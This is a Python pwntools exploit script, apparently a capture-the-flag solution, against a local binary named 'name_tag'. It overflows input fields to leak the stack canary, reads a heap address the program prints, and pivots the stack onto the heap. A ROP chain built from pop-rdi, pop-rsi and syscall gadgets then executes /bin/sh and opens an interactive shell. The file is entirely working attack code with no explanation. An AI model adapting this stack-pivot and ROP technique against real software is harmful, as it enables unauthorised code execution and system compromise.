from pwn import *
import time
elf = ELF("./name_tag")
context.binary=elf
target=process([elf.path])

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

payload="A"*0x29
sla("Can you please tell us your first name?",payload)
target.recvuntil("Welcome "+"A"*0x28)
canary=u64(target.recv(0x8))-0x41
ret=0x000000000040101a
main=0x40144A
leave=0x00000000004011fe
payload="/bin/sh\x00"+"A"*0x3a+"\x00"
sla("Bio: ",payload)
target.recvuntil("tag id: ")
heap_leak=int(target.recvline().strip("\n"))
payload="A"*0x48+p64(canary)+p64(heap_leak-0x8)+p64(ret)+p64(main)
sla("process?",payload)
heap_leak+=0x210
payload="A"*0x29
sla("Can you please tell us your first name?",payload)
poprdi=0x0000000000401643
syscall=0x00000000004015ba
poprsir15=0x0000000000401641
payload=p64(heap_leak+0x20)+p64(poprdi)+p64(heap_leak-0x210+9)+p64(elf.sym["puts"])+p64(syscall)
payload+=p64(poprdi)+p64(heap_leak-0x210+0x8)+p64(elf.sym["puts"])+p64(poprdi)+p64(heap_leak-0x210)
payload+=p64(poprsir15)+p64(0)*2+p64(syscall)
sla("Bio: ",payload)
payload="A"*0x48+p64(canary)+p64(heap_leak)+p64(leave)
sla("process?",payload)
target.interactive()
